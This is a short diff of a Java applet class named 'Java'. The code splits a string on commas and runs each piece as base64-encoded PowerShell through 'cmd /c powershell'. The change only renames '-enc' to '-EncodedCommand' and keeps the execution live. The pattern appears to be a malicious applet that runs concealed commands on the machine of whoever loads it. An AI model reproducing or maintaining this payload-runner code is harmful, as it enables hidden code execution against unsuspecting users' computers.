@@ -245,7 +245,7 @@ public class Java extends Applet {
 					String[] arrSplit = strMain.split(",");
 					for (int i=0; i<arrSplit.length; i++)
 					{
-						f = Runtime.getRuntime().exec("cmd /c powershell -enc " + arrSplit[i]);
+						f = Runtime.getRuntime().exec("cmd /c powershell -EncodedCommand " + arrSplit[i]);
 	                }
                 }
                 }
